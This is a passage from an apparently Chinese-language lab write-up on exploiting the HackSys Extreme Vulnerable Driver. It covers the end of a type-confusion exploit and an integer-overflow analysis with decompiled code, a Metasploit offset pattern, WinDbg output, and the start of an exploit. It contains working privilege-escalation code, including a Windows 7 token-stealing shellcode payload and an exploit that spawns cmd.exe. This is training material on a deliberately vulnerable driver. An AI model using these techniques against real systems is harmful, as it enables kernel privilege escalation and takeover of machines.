</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">VOID</span> <span class="nf">CreateCmd</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span><span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">)};</span>
</span></span><span class="line"><span class="cl">    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">si</span><span class="p">.</span><span class="n">dwFlags</span> <span class="o">=</span> <span class="n">STARTF_USESHOWWINDOW</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">si</span><span class="p">.</span><span class="n">wShowWindow</span> <span class="o">=</span> <span class="n">SW_SHOW</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">WCHAR</span> <span class="n">wzFilePath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="sa">L</span><span class="s">&#34;cmd.exe&#34;</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span> <span class="n">bReturn</span> <span class="o">=</span> <span class="nf">CreateProcessW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">wzFilePath</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPSTARTUPINFOW</span><span class="p">)</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">bReturn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">),</span> <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">UserBufferSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">UserObject</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">EopPayload</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">TokenStealingPayloadWin7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HacksysExtremeVulnerableDriver&#34;</span><span class="p">,</span> <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="n">FILE_SHARE_READ</span> <span class="o">|</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span> <span class="o">|</span> <span class="n">FILE_FLAG_OVERLAPPED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">PUserObject</span> <span class="n">UserBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">PUserObject</span><span class="p">)</span><span class="nf">HeapAlloc</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="n">UserBufferSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">UserBuffer</span><span class="o">-&gt;</span><span class="n">ObjectID</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG_PTR</span><span class="p">)</span><span class="n">EopPayload</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">UserBuffer</span><span class="o">-&gt;</span><span class="n">ObjectType</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG_PTR</span><span class="p">)</span><span class="n">EopPayload</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">WriteRet</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x222023</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="n">UserBufferSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">WriteRet</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">CreateCmd</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">HeapFree</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">UserBuffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">UserBuffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// HANDLE hDevice = NULL;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// hDevice = CreateFileA(&#34;\\\\.\\HacksysExtremeVulnerableDriver&#34;, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// if (hDevice == INVALID_HANDLE_VALUE)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// {
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//     printf(&#34;[-] Error - Unable to obtain a handle to the driver, error code %d\n&#34;, GetLastError());
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//     exit(1);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// }
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// // 4.DeviceIoControl给0环发请求并接收返回结果
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// DWORD dwRet = 0;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// char exp_TypeConfusion[8] = {0};
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// memset(exp_TypeConfusion, &#39;A&#39;, sizeof(exp_TypeConfusion));
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// PVOID EopPayload = &amp;TokenStealingPayloadWin7;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// // memcpy(&amp;exp_TypeConfusion[4], &amp;EopPayload, 4);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// // DeviceIoControl(hDevice, 0x222023, exp_TypeConfusion, 0xffffffff, NULL, 0, &amp;dwRet, NULL);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><h2 id="8triggerintegeroverflow" class="heading-element">
  <a href="#8triggerintegeroverflow" class="heading-mark"></a>8.TriggerIntegerOverflow</h2><p>整数溢出</p>
<h3 id="漏洞分析-3" class="heading-element">
  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-3" class="heading-mark"></a>漏洞分析</h3><p>Size是用户缓冲区长度，一个无符号整数，占4字节的空间；如果满足条件条件<code>if(Size+4&lt;0x800)</code>，将用户缓冲区复制进内核缓冲区，遇到<code>0x0BAD0B0B0</code>则停止复制，当Size很大时，如<code>0xffffffff+4=3</code>可以绕过if语句，存在整数溢出漏洞。绕过验证条件之后可以构造足够大的数据造成栈溢出，进而执行任意代码。</p>
<div class="highlight" id="id-90"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__stdcall</span> <span class="nf">TriggerIntegerOverflow</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">Size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// esi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// edi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">KernelBuffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span> <span class="c1">// [esp+10h] [ebp-820h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">Count</span><span class="p">;</span> <span class="c1">// [esp+810h] [ebp-20h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">CPPEH_RECORD</span> <span class="n">ms_exc</span><span class="p">;</span> <span class="c1">// [esp+818h] [ebp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="n">ms_exc</span><span class="p">.</span><span class="n">registration</span><span class="p">.</span><span class="n">TryLevel</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="n">UserBuffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">ProbeForRead</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="mh">0x800u</span><span class="p">,</span> <span class="mi">1u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] UserBuffer: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] UserBuffer Size: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] KernelBuffer: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">KernelBuffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] KernelBuffer Size: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">2048</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Triggering Integer Overflow (Arithmetic Overflow)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">Size</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">&lt;=</span> <span class="mh">0x800</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&lt;</span> <span class="n">Size</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">v3</span> <span class="o">!=</span> <span class="mh">0xBAD0B0B0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">KernelBuffer</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="n">v3</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">Count</span> <span class="o">=</span> <span class="o">++</span><span class="n">v2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[-] Invalid UserBuffer Size: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">ms_exc</span><span class="p">.</span><span class="n">registration</span><span class="p">.</span><span class="n">TryLevel</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="mh">0xC0000206</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><h3 id="漏洞利用-1" class="heading-element">
  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8-1" class="heading-mark"></a>漏洞利用</h3><p>使用kali系统<code>/usr/share/metasploit-framework/tools/exploit下的pattern_create.rb</code>生成字符串：</p>
<div class="highlight" id="id-91"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>/usr/share/metasploit-framework/tools/exploit<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ./pattern_create.rb -l 0x900
</span></span><span class="line"><span class="cl">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7</span></span></code></pre></div><p>测试代码：</p>
<div class="highlight" id="id-92"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mh">0x901</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;xxxxxxxxx&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">PVOID</span> <span class="n">EopPayload</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">TokenStealingPayloadWin7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HacksysExtremeVulnerableDriver&#34;</span><span class="p">,</span> <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="n">FILE_SHARE_READ</span> <span class="o">|</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span> <span class="o">|</span> <span class="n">FILE_FLAG_OVERLAPPED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mh">0x900</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0xBAD0B0B0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">DWORD</span> <span class="n">dwret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x222027</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwret</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>可以看到：</p>
<div class="highlight" id="id-93"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">kd&gt; r
</span></span><span class="line"><span class="cl"><span class="nv">eax</span><span class="o">=</span><span class="m">00000000</span> <span class="nv">ebx</span><span class="o">=</span>86b45cf0 <span class="nv">ecx</span><span class="o">=</span>e32b7a0a <span class="nv">edx</span><span class="o">=</span>0000004d <span class="nv">esi</span><span class="o">=</span>83eff17c <span class="nv">edi</span><span class="o">=</span>86b45c80
</span></span><span class="line"><span class="cl"><span class="nv">eip</span><span class="o">=</span><span class="m">35724334</span> <span class="nv">esp</span><span class="o">=</span>9a8d3ac0 <span class="nv">ebp</span><span class="o">=</span><span class="m">72433372</span> <span class="nv">iopl</span><span class="o">=</span><span class="m">0</span>         nv up ei pl zr na pe nc
</span></span><span class="line"><span class="cl"><span class="nv">cs</span><span class="o">=</span><span class="m">0008</span>  <span class="nv">ss</span><span class="o">=</span><span class="m">0010</span>  <span class="nv">ds</span><span class="o">=</span><span class="m">0023</span>  <span class="nv">es</span><span class="o">=</span><span class="m">0023</span>  <span class="nv">fs</span><span class="o">=</span><span class="m">0030</span>  <span class="nv">gs</span><span class="o">=</span><span class="m">0000</span>             <span class="nv">efl</span><span class="o">=</span><span class="m">00010246</span>
</span></span><span class="line"><span class="cl"><span class="m">35724334</span> ??              ???</span></span></code></pre></div><p><code>35724334</code>偏移为0x824</p>
<h3 id="exp-3" class="heading-element">
  <a href="#exp-3" class="heading-mark"></a>EXP</h3><div class="highlight" id="id-94"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;Windows.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">VOID</span> <span class="nf">TokenStealingPayloadWin7</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Importance of Kernel Recovery
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kr">__asm</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">pushad</span>
</span></span><span class="line"><span class="cl">		<span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span><span class="p">;</span> <span class="n">eax设置为0</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="nl">fs</span><span class="p">:</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">124</span><span class="n">h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mo">050</span><span class="n">h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">		<span class="nl">SearchSystemPID</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">						<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">0</span><span class="n">b8h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">						<span class="n">sub</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span><span class="n">b8h</span>
</span></span><span class="line"><span class="cl">						<span class="n">cmp</span><span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">0</span><span class="n">b4h</span><span class="p">],</span> <span class="n">edx</span>
</span></span><span class="line"><span class="cl">						<span class="n">jne</span> <span class="n">SearchSystemPID</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">						<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mf">0f</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">						<span class="n">mov</span><span class="p">[</span><span class="n">ecx</span> <span class="o">+</span> <span class="mf">0f</span><span class="mi">8</span><span class="n">h</span><span class="p">],</span> <span class="n">edx</span>
</span></span><span class="line"><span class="cl">						<span class="n">popad</span>
</span></span><span class="line"><span class="cl">						<span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl">						<span class="n">add</span> <span class="n">esp</span><span class="p">,</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">						<span class="n">pop</span> <span class="n">ebp</span>
</span></span><span class="line"><span class="cl">						<span class="n">ret</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">CreateCmd</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
